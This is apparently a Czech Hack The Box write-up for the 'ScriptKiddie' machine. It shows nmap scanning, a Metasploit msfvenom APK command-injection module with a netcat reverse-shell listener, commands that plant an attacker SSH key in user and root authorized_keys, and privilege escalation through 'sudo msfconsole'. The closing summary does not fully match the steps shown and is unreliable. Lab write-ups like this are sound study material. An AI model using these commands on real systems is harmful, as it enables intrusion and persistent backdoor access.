---
layout: post
author: Tomáš Matějíček
title: "ScriptKiddie"
date: 2021-01-11
tags: linux command-injection ssh sudo exploit enumeration
---

## Úvod a kontext

ScriptKiddie je stroj z Hack The Box. Článek sleduje cestu od prvotní enumerace k ověřenému přístupu a průběžně vysvětluje, proč měl každý další krok technický smysl.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
ports=$(nmap -p- -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
```
```
PORT   STATE SERVICE VERSION
```

### Detailní analýza služeb

V dalším kroku si zpřesňuji verze služeb a jejich charakteristiky, protože právě z těchto detailů obvykle vzniká rozhodnutí, zda pokračovat přes web, SSH nebo jinou vrstvu.
```text
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
```
```
| ssh-hostkey:
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

5000
```

## Analýza zjištění

### Identifikace a hledání exploitu

Zjišťuji technologii a ověřuji známé zranitelnosti.
```bash
searchsploit msfvenom
```
```
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                         |  Path
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Metasploit Framework 6.0.11 - msfvenom APK template command injection                                                                  | multiple/local/49491.py
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

## Získání přístupu

### Přihlášení na cíl (2)

Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
```text
msfconsole
```
```
use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
set lhost 10.10.14.7
set lport 4444
exploit

netcat -lvp 4444
upload template

- přidat ssh identitu: mkdir -p ~/.ssh && chmod 700 ~/.ssh && touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo "ssh-rsa __CENSORED__== hack@t" >> ~/.ssh/authorized_keys
```

### Spuštění exploitu

V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
```bash
sudo msfconsole
```

### Získání user flagu

User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.

Následující úsek zachycuje přechod k prvnímu stabilnímu uživatelskému přístupu nebo shellu.

```text
- přidat ssh identitu: mkdir -p ~/.ssh && chmod 700 ~/.ssh && touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDBpuZ8+QR3hnONfIO2Y/vhoVRgVDpeOUrpxa+EOnRNhAV9/dYNoi/hOn0TTNcf0I5ws2UXkJAZsjH6IRImyRSDA5ly8K8lYqTyWRUGU1EGZ2ovlR2fjzOTaeuKY8VylnwQzQBNrFPoDZ6uKjpORoRszHQf9WzrtZ8M+zcpGO0MLPiuEl78INxwii7y94CAn1gl+xlrIgKAF3inpuTlaLvEljLe1JgsYKJIcZNplYgA9pcDx7HWFceyAUwpdc438kTiANtmz6863mjfuoZ1LQ9mK8pmR010L9eQhO8FGq15Hpru0AJzIuTNoEJKYsdBG6ttfQ4DLmey6h0IE5IkcqrfH9gAweGIJ68zn3Xh1GP9CWO8iKxkMZPemr5GhBKB1mr0ebCjuWwxzmzmzeBcIm6PlSkkt5iULsgdgsvu/ptFIFGVukajnihbK/b3uWCDtaJcgaSILoSomouxjfXqmAwj/TaM0qHsT7K9NZsPfOB5ZAXa2spPR+AGsJUYviAkFDPvgSeRrf2g9QW37pYw0Vjl+pmlehyW1Pl0RKi5eXxEQHZQddlDbpcwk6K9GVA04juJce5odDeWk0TUuxTgU2y1jnGnvQZSizjl6YcRXUNDXF2H/tFVKaW0D5acreO4JBU9cl6MCwWONLkV5GTLHNAEzIsSAk4NJw+ppfkBwBIs1Q== hack@t" >> ~/.ssh/authorized_keys
ssh kid@$IP
netcat -lvp 4444
```

## Eskalace oprávnění

### Průzkum možností eskalace

Hledám chybné konfigurace a cesty k vyšším oprávněním.
```bash
sudo -l
```

### Získání root flagu

Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.

Následující úsek zachycuje i postup, kterým se potvrzuje privilegovaný přístup a načtení `root.txt`.

```text
sudo msfconsole

cat /root/root.txt

83533c7230dd3648c1319e433934cb8a

mkdir -p /root/.ssh && chmod 700 /root/.ssh && touch /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDBpuZ8+QR3hnONfIO2Y/vhoVRgVDpeOUrpxa+EOnRNhAV9/dYNoi/hOn0TTNcf0I5ws2UXkJAZsjH6IRImyRSDA5ly8K8lYqTyWRUGU1EGZ2ovlR2fjzOTaeuKY8VylnwQzQBNrFPoDZ6uKjpORoRszHQf9WzrtZ8M+zcpGO0MLPiuEl78INxwii7y94CAn1gl+xlrIgKAF3inpuTlaLvEljLe1JgsYKJIcZNplYgA9pcDx7HWFceyAUwpdc438kTiANtmz6863mjfuoZ1LQ9mK8pmR010L9eQhO8FGq15Hpru0AJzIuTNoEJKYsdBG6ttfQ4DLmey6h0IE5IkcqrfH9gAweGIJ68zn3Xh1GP9CWO8iKxkMZPemr5GhBKB1mr0ebCjuWwxzmzmzeBcIm6PlSkkt5iULsgdgsvu/ptFIFGVukajnihbK/b3uWCDtaJcgaSILoSomouxjfXqmAwj/TaM0qHsT7K9NZsPfOB5ZAXa2spPR+AGsJUYviAkFDPvgSeRrf2g9QW37pYw0Vjl+pmlehyW1Pl0RKi5eXxEQHZQddlDbpcwk6K9GVA04juJce5odDeWk0TUuxTgU2y1jnGnvQZSizjl6YcRXUNDXF2H/tFVKaW0D5acreO4JBU9cl6MCwWONLkV5GTLHNAEzIsSAk4NJw+ppfkBwBIs1Q== hack@t" >> /root/.ssh/authorized_keys
```

## Shrnutí klíčových poznatků

- Úvodní směr určovala webová enumerace: důležité nebylo jen něco najít, ale správně vyhodnotit, který artefakt skutečně otevírá další krok.
- K uživatelskému přístupu vedla práce s nalezenými přihlašovacími údaji, klíči nebo hashi a jejich ověření proti reálně dostupné službě.
- Eskalace oprávnění stála na příliš širokém `sudo` pravidle nebo na možnosti ovlivnit vstup či prostředí privilegovaného procesu.

## Co si odnést do praxe

- Upload a import souborů musí validovat typ, obsah i následné zpracování, protože právě tyto workflow často mění běžnou funkci aplikace v RCE.
- SSH klíče, hesla a uložené tokeny je nutné oddělovat mezi účty i službami; znovupoužití přístupů rychle mění lokální únik ve stabilní shell.
- Pravidla `sudo` mají být co nejmenší a bez možnosti ovlivnit příkaz, argumenty nebo prostředí z neprivilegovaného kontextu.
- Inventura verzí a včasné záplatování snižují prostor pro přímé zneužití známých chyb i pro slepé spoléhání na zastaralé komponenty.